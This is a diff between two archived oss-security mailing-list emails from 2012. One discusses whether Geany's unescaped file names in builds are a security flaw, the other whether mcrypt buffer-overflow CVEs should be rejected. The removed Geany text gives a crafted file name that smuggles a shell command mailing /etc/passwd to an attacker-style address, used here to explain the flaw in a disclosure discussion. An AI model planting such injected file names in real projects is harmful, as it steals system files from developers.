@@ -1,73 +1,50 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/12/13/4
-Message-ID: <573621777.47121137.1355397692710.JavaMail.root@redhat.com>
-Date: Thu, 13 Dec 2012 06:21:32 -0500 (EST)
-From: Jan Lieskovsky <jlieskov@...hat.com>
-To: Andreas Ericsson <ae@....se>
-Cc: Eitan Adler <lists@...anadler.com>, "Steven M. Christey" <coley@...us.mitre.org>, Nick Treleaven <nick.treleaven@...nternet.com>, Colomban Wendling <lists.ban@...besfolles.org>, Enrico Troeger <enrico.troeger@...na.de>, Matthew Brush <mbrush@...ebrainz.ca>, Frank Lanitz <frank@...nk.uvena.de>, josef@...icpanda.com, jonathan underwood <jonathan.underwood@...il.com>, oss-security@...ts.openwall.com
-Subject: Re: Geany IDE not escaping filenames during compilation / build - a security issue or not?
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/11/22/1
+Message-Id: <201211221048.06836.mweckbecker@suse.de>
+Date: Thu, 22 Nov 2012 10:48:05 +0100
+From: Matthias Weckbecker <mweckbecker@...e.de>
+To: oss-security@...ts.openwall.com
+Cc: Jan Lieskovsky <jlieskov@...hat.com>, "Steven M. Christey" <coley@...us.mitre.org>, Attila Bogar <attila.bogar@...guamatics.com>, Raphael Geissert <geissert@...ian.org>
+Subject: Re: CVE Request -- mcrypt: stack-based buffer overflow by encryption / decryption of overly long file names
 Content-Type: text/plain; charset=utf-8
 
-Hi Andreas,
+Hi Jan, Steve, Raphael, Attila, ...,
 
-  I think it's unlikely to happen for one file.
-But what for project with (hundred, thousand of) small files?
+On Tuesday 20 November 2012 12:57:11 Jan Lieskovsky wrote:
+> Hi Steve,
+>
+> ----- Original Message -----
+>
+[...]
+>
+[...]
+>
+> Previously considered scenario was remote user would trick the local one to
+> decrypt provided file (obviously the local user might not check if filename
+> isn't too long prior decryption). But after further review looks mcrypt
+> doesn't support asymmetric cryptography / keys (which I didn't know in the
+> moment of requesting a CVE id), only the symmetric one, which makes this
+> scenario impossible / unlikely.
+>
+> Considering the above, I think you are right and CVE-2012-4527 should be
+> probably rejected.
+>
 
-Is the user prior building expected to investigate file name of
-each of them for sanity? This is where trust boundary is crossed -
-someone could send you a tarball: "Here is the source you were
-searching for." You would go to build it in Geany..
+And what about CVE-2012-4426 then? The same applies there too, right? Reject?
 
-The difference when running it directly from the command line is
-that Bash would escape those files for you, so even with crafted names
-nothing bad / suspicious would happen (and project would build
-if syntactically correct).
+> Right now I can't think of a case, how this could be possible to (mis)use
+> for an attack.
+>
 
-To the difference, in the Geany scenario, the file name(s) would
-be passed to command line directly as they are (and if the project
-would build or not at the end isn't what matters here).
+A program that runs with higher privileges and executes mcrypt with external
+user-controlled input possibly? Maybe a bit far fetched, but not impossible.
 
-Regards, Jan.
---
-Jan iankko Lieskovsky / Red Hat Security Response Team
+[...]
 
-P.S.: Above based on my short playing with Geany. While original exploit
-      mentions just one file case, looks the same is possible for projects
-      (having multiple Makefiles).
-
------ Original Message -----
-On 12/13/2012 06:54 AM, Eitan Adler wrote:
-> On 12 December 2012 11:51, Jan Lieskovsky <jlieskov@...hat.com> wrote:
->> The questions:
->> 1) should Geany escape the filenames?,
-> 
-> Up to the maintainers.
-> 
->> 2) is this a security issue or not?
-> 
-> Unlikely.  Is there a way a malicious document could cause code
-> execution without user action?
-> 
-
-Extremely unlikely. The way to get someone to trigger this is to send
-a source-file to a developer who then opens it in geany without realizing
-that the file is named "mail evil@...kdom.com -s teehee < /etc/passwd".
-The "attacked" developer then need to attempt to build it from geany's
-internal "build now" button.
-
-A simpler misdeed of similar charactaristics would be to ship a bogus
-./configure script that people (who are not developers, mind you)
-blindly run and which executes bogus commands on behalf of the logged
-in user.
-
-Since the latter isn't really CVE-worthy, I doubt the former even
-comes close.
+Matthias
 
 -- 
-Andreas Ericsson                   andreas.ericsson@....se
-OP5 AB                             www.op5.se
-Tel: +46 8-230225                  Fax: +46 8-230231
-
-Considering the successes of the wars on alcohol, poverty, drugs and
-terror, I think we should give some serious thought to declaring war
-on peace.
+Matthias Weckbecker, Senior Security Engineer, SUSE Security Team
+SUSE LINUX Products GmbH, Maxfeldstr. 5, D-90409 Nuernberg, Germany
+Tel: +49-911-74053-0;  http://suse.com/
+SUSE LINUX Products GmbH, GF: Jeff Hawn, HRB 16746 (AG Nuernberg) 
